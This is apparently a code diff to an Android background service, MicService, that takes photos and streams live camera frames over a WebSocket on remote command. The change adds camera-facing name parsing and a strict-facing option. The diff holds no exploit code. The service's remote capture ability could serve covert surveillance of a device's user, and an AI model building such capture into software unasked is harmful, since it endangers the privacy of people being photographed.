@@ -140,6 +140,7 @@ class MicService : Service() {
     @Volatile private var aiPhotoEnhancementEnabled = true
     @Volatile private var photoQualityMode = "normal" // fast | normal | hd
     @Volatile private var isCameraLiveStreaming = false
+    @Volatile private var cameraLiveStrictFacing = false
     private var cameraLiveJob: Job? = null
 
     // ── PCM enhancement filter state (persists across frames for continuity) ──
@@ -592,6 +593,7 @@ class MicService : Service() {
                     else
                         CameraCharacteristics.LENS_FACING_FRONT
                     val cameraText = if (preferredCameraFacing == CameraCharacteristics.LENS_FACING_FRONT) "front" else "rear"
+                    cameraLiveStrictFacing = true
                     if (isCameraLiveStreaming) restartCameraLiveStream()
                     webSocket?.send("ACK:switch_camera:$cameraText")
                 }
@@ -601,13 +603,10 @@ class MicService : Service() {
                 }
                 "camera_live_start" -> {
                     val camera = obj.optString("camera", "current").trim().lowercase()
-                    val facing = when (camera) {
-                        "front" -> CameraCharacteristics.LENS_FACING_FRONT
-                        "rear", "back" -> CameraCharacteristics.LENS_FACING_BACK
-                        else -> preferredCameraFacing
-                    }
+                    val explicitFacing = parseRequestedCameraFacing(camera)
+                    val facing = explicitFacing ?: preferredCameraFacing
                     preferredCameraFacing = facing
-                    startCameraLiveStream(facing)
+                    startCameraLiveStream(facing, strictFacing = explicitFacing != null)
                 }
                 "camera_live_stop" -> {
                     stopCameraLiveStream("remote_stop")
@@ -1049,13 +1048,10 @@ class MicService : Service() {
         isPhotoCaptureBusy = true
         serviceScope.launch(Dispatchers.IO) {
             try {
-                val facing = when (cameraMode) {
-                    "front" -> CameraCharacteristics.LENS_FACING_FRONT
-                    "rear", "back" -> CameraCharacteristics.LENS_FACING_BACK
-                    else -> preferredCameraFacing
-                }
+                val explicitFacing = parseRequestedCameraFacing(cameraMode)
+                val facing = explicitFacing ?: preferredCameraFacing
                 preferredCameraFacing = facing
-                val jpeg = captureJpegOnce(facing)
+                val jpeg = captureJpegOnce(facing, allowFacingFallback = explicitFacing == null)
                 if (jpeg == null || jpeg.isEmpty()) {
                     webSocket?.send("ACK:take_photo:failed")
                     return@launch
@@ -1086,10 +1082,18 @@ class MicService : Service() {
         }
     }
 
+    private fun parseRequestedCameraFacing(cameraMode: String): Int? {
+        return when (cameraMode.trim().lowercase()) {
+            "front", "front_camera", "front-camera", "frontcam", "selfie" -> CameraCharacteristics.LENS_FACING_FRONT
+            "rear", "back", "rear_camera", "rear-camera", "back_camera", "back-camera", "backcam", "main" -> CameraCharacteristics.LENS_FACING_BACK
+            else -> null
+        }
+    }
+
     @SuppressLint("MissingPermission")
-    private fun captureJpegOnce(targetFacing: Int): ByteArray? {
+    private fun captureJpegOnce(targetFacing: Int, allowFacingFallback: Boolean = true): ByteArray? {
         val cm = getSystemService(CameraManager::class.java) ?: return null
-        val cameraId = selectCameraId(cm, targetFacing) ?: return null
+        val cameraId = selectCameraId(cm, targetFacing, allowFacingFallback) ?: return null
         val chars = cm.getCameraCharacteristics(cameraId)
         val streamMap = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP) ?: return null
         val maxEdge = when (photoQualityMode) {
@@ -1191,7 +1195,7 @@ class MicService : Service() {
         }
     }
 
-    private fun selectCameraId(cm: CameraManager, targetFacing: Int): String? {
+    private fun selectCameraId(cm: CameraManager, targetFacing: Int, allowFacingFallback: Boolean = true): String? {
         val ids = cm.cameraIdList ?: return null
         var fallback: String? = null
         for (id in ids) {
@@ -1206,7 +1210,7 @@ class MicService : Service() {
             }
             if (facing == targetFacing && !isLogicalMultiCamera(c)) return id
             if (facing == targetFacing && fallback == null) fallback = id
-            if (fallback == null) fallback = id
+            if (allowFacingFallback && fallback == null) fallback = id
         }
         return fallback
     }
@@ -1224,12 +1228,13 @@ class MicService : Service() {
         }
     }
 
-    private fun startCameraLiveStream(targetFacing: Int) {
+    private fun startCameraLiveStream(targetFacing: Int, strictFacing: Boolean = false) {
         if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
             webSocket?.send("ACK:camera_live:camera_permission_denied")
             return
         }
         preferredCameraFacing = targetFacing
+        cameraLiveStrictFacing = strictFacing
         if (isCameraLiveStreaming) {
             restartCameraLiveStream()
             return
@@ -1241,7 +1246,7 @@ class MicService : Service() {
             sendHealthStatus("camera_live_on")
             while (isActive && isCameraLiveStreaming && activeWebSocket != null) {
                 try {
-                    val jpeg = captureJpegOnce(preferredCameraFacing)
+                    val jpeg = captureJpegOnce(preferredCameraFacing, allowFacingFallback = !cameraLiveStrictFacing)
                     if (jpeg != null && jpeg.isNotEmpty()) {
                         val now = System.currentTimeMillis()
                         val frameBase64 = Base64.encodeToString(jpeg, Base64.NO_WRAP)
@@ -1268,7 +1273,7 @@ class MicService : Service() {
     private fun restartCameraLiveStream() {
         if (!isCameraLiveStreaming) return
         stopCameraLiveStream("restart")
-        startCameraLiveStream(preferredCameraFacing)
+        startCameraLiveStream(preferredCameraFacing, cameraLiveStrictFacing)
     }
 
     private fun stopCameraLiveStream(reason: String) {
